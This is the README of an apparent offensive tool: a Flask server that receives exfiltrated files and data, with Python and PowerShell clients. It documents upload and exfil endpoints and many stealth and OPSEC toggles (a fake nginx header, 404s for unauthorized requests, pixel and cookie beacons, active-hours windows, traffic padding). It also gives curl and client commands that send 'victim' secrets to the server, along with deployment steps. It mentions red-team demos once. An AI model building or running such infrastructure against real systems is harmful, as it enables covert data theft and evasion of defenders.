Data Exfiltration Server (Flask)

A minimal but practical data exfiltration receiver written with Flask. It supports file uploads, raw/JSON data capture, file listing and downloading, logging, and optional bearer-token authentication.

Features
- Secure file uploads with unique names (timestamp + UUID)
- Raw/JSON data exfil endpoint that writes captured content to disk
- File listing and downloading
- Structured logging to `server/logs/exfil.log`
- Optional bearer token auth via `EXFIL_TOKEN`
- Configurable max upload size via `MAX_CONTENT_LENGTH_MB` (default 50MB)

Layout
- `server/app.py` — Flask app with endpoints
- `server/storage/` — Captured files and data
- `server/logs/` — Server logs

Quick Start
1) Install deps

   pip install flask

2) (Optional) Set a token and size limit

   export EXFIL_TOKEN="your-strong-token"
   export MAX_CONTENT_LENGTH_MB=50

3) Run the server

   python server/app.py

   The server listens on 0.0.0.0:8080.

Endpoints
- GET `/` — Readiness string
- GET `/health` — JSON: status, file count, max size, auth requirement
- POST `/upload` — Multipart file upload field `file`
- POST `/exfil` — Capture data
  - JSON body: saved as a `.json` payload
  - Form: field `data`
  - Raw body: saved as `.bin`
- GET `/files` — List saved files with metadata
- GET `/files/<saved_as>` — Download a specific saved file

Stealth Options
- Headers: server responds with a common `Server` header (default `nginx`), cache hints for GETs.
- Jitter: add response delay via `EXFIL_JITTER_MIN_MS` and `EXFIL_JITTER_MAX_MS`.
- Silent: make `POST /exfil` and `POST /upload` return HTTP 204 with no body via `EXFIL_SILENT=1`.
- Alternate path: expose exfil as a different path via `EXFIL_PATH` (e.g. `/api/v1/collect`). Both `/exfil` and the alternate path work.
- TLS: enable HTTPS by setting `EXFIL_SSL_CERT` and `EXFIL_SSL_KEY` to your cert and key paths.
- Benign endpoints: `/favicon.ico` and `/robots.txt` are provided to look normal.
 - GET/cookie exfil: enable a pixel endpoint that captures data from query, cookie, or header and returns a 1x1 GIF.
 - Host/Referer allowlist: drop requests with mismatched `Host` or referrers.
 - Active hours: only respond during allowed hours to reduce anomalies.
- Gzip: compress larger JSON/text responses if client advertises `Accept-Encoding: gzip`.
- Padding: add random spaces to JSON responses to vary packet sizes.
- Rate limiting: throttle per token/IP with `EXFIL_RATE_WINDOW_SEC` and `EXFIL_RATE_MAX`.
- Health toggle: `EXFIL_DISABLE_HEALTH=1` makes `/health` return 404 (or omit via proxy).
- Unauthorized as 404: `EXFIL_UNAUTH_404=1` blends unauthorized requests as 404 instead of 401.
- Chunked GET: large GET/cookie beacons can be split and reassembled server-side.

TLS Quickstart (self-signed)

  openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 \
    -subj "/CN=localhost"
  export EXFIL_SSL_CERT=$(pwd)/cert.pem
  export EXFIL_SSL_KEY=$(pwd)/key.pem
  python server/app.py

Clients
- Python client: `client/exfil_client.py` (requires `requests`)

  pip install requests
  # JSON mode
  python client/exfil_client.py https://127.0.0.1:8080 json '{"host":"victim"}' \
    --token "$EXFIL_TOKEN" --insecure --path ${EXFIL_PATH:-/exfil}

  # Raw text mode
  python client/exfil_client.py https://127.0.0.1:8080 raw "secret text" \
    --token "$EXFIL_TOKEN" --insecure

  # File upload mode
  python client/exfil_client.py https://127.0.0.1:8080 file /path/to/file \
    --token "$EXFIL_TOKEN" --insecure

  # GET pixel mode (query param)
  python client/exfil_client.py https://127.0.0.1:8080 get "beacon-content" \
    --get-path ${EXFIL_GET_PATH:-/pixel.gif} --get-param ${EXFIL_GET_PARAM:-q} \
    --chunk-size 1200 \
    --token "$EXFIL_TOKEN" --insecure

  # Cookie pixel mode
  python client/exfil_client.py https://127.0.0.1:8080 cookie "beacon-content" \
    --cookie-name c --auth-cookie-name auth --chunk-size 1200 --insecure

- PowerShell client: `client/ps_exfil.ps1`

  pwsh client/ps_exfil.ps1 -Base https://127.0.0.1:8080 -Mode json -Payload '{"x":1}' -Token $env:EXFIL_TOKEN -Insecure
  pwsh client/ps_exfil.ps1 -Base https://127.0.0.1:8080 -Mode file -Payload C:\\path\\to\\file.txt -Token $env:EXFIL_TOKEN -Insecure

Operational Notes
- Prefer running behind a reverse proxy (nginx/caddy) for better TLS and header control.
- Use tokens and limit listing routes in production; consider disabling `/files` entirely for higher OPSEC.
- Shape traffic and timing to blend with expected client patterns.

Deployment
- systemd (template files under `deploy/systemd/`):
  - Copy unit: `sudo cp deploy/systemd/exfil.service /etc/systemd/system/exfil.service`
  - Create service user and path: `sudo useradd --system --home /opt/exfil --shell /usr/sbin/nologin exfil`
  - Place code at `/opt/exfil` and set ownership: `sudo rsync -a --delete . /opt/exfil/ && sudo chown -R exfil:exfil /opt/exfil`
  - Env file: `sudo cp deploy/systemd/exfil.env /etc/default/exfil` and edit values
  - Start: `sudo systemctl daemon-reload && sudo systemctl enable --now exfil`
  - Logs: `journalctl -u exfil -f`

- Nginx (template file under `deploy/nginx/exfil.conf`):
  - Edit `server_name` and cert paths; align `client_max_body_size` and `/api/v1/collect` with your `EXFIL_PATH`.
  - Copy: `sudo cp deploy/nginx/exfil.conf /etc/nginx/sites-available/exfil.conf && sudo ln -s /etc/nginx/sites-available/exfil.conf /etc/nginx/sites-enabled/`
  - Test & reload: `sudo nginx -t && sudo systemctl reload nginx`

OPSEC Toggles
- `EXFIL_DISABLE_FILES=1`: Do not register `/files` routes at all.
- `EXFIL_PATH=/api/v1/collect`: Adds an alternate POST path to `exfil` (keeps `/exfil`).
- `EXFIL_SILENT=1`: Return 204 No Content on exfil/upload.
- `EXFIL_SERVER_HEADER=nginx`: Masquerade server header label.
 - `EXFIL_GET_ENABLE=1`: Enable the GET pixel endpoint.
 - `EXFIL_GET_PATH=/pixel.gif`: Route for GET exfil beacon.
 - `EXFIL_GET_PARAM=q`: Query param name carrying base64url payload.
 - `EXFIL_ALLOWED_HOSTS=exfil.example.com,www.example.com`: Only service requests for specified Host headers.
 - `EXFIL_ALLOWED_REFERERS=https://www.google.com/,https://example.com/`: Only service requests that include one of these referrers.
- `EXFIL_ACTIVE_START=1` and `EXFIL_ACTIVE_END=5`: Only respond between 01:00–05:00 local time.
- `EXFIL_PAD_MIN=0` and `EXFIL_PAD_MAX=64`: Random padding (spaces) appended to JSON responses.
- `EXFIL_RATE_WINDOW_SEC=60` and `EXFIL_RATE_MAX=30`: Limit to 30 requests per 60 seconds per token/IP.
- `EXFIL_DISABLE_HEALTH=1`: Make `/health` return 404.
- `EXFIL_UNAUTH_404=1`: Respond to unauthorized as 404 for stealth.
- `EXFIL_CHUNK_ENABLE=1` and `EXFIL_CHUNK_TTL_SEC=900`: Enable GET chunk reassembly and set TTL for incomplete chunks.

Auth
- If `EXFIL_TOKEN` is set, include it as a bearer token or query param:

  curl -H "Authorization: Bearer $EXFIL_TOKEN" http://localhost:8080/health
  curl http://localhost:8080/files?token=$EXFIL_TOKEN

Examples
- Upload a file

  curl -H "Authorization: Bearer $EXFIL_TOKEN" -F "file=@/path/to/file" \
       http://localhost:8080/upload

- Exfil JSON data

  curl -H "Authorization: Bearer $EXFIL_TOKEN" -H "Content-Type: application/json" \
       -d '{"host":"victim","secrets":[1,2,3]}' http://localhost:8080/exfil

- Exfil raw text

  curl -H "Authorization: Bearer $EXFIL_TOKEN" -d "some secret text" \
       http://localhost:8080/exfil

- List files

  curl -H "Authorization: Bearer $EXFIL_TOKEN" http://localhost:8080/files | jq

- Download a file

  curl -H "Authorization: Bearer $EXFIL_TOKEN" -O \
       http://localhost:8080/files/<saved_as>

Notes
- Filenames are saved as: `YYYYMMDDThhmmssZ_<uuid>_<original>`.
- Avoid sending extremely large files unless you raise `MAX_CONTENT_LENGTH_MB`.
- For red-team demos, front this with a domain and TLS; consider traffic shaping and client-side encryption depending on your scenario.
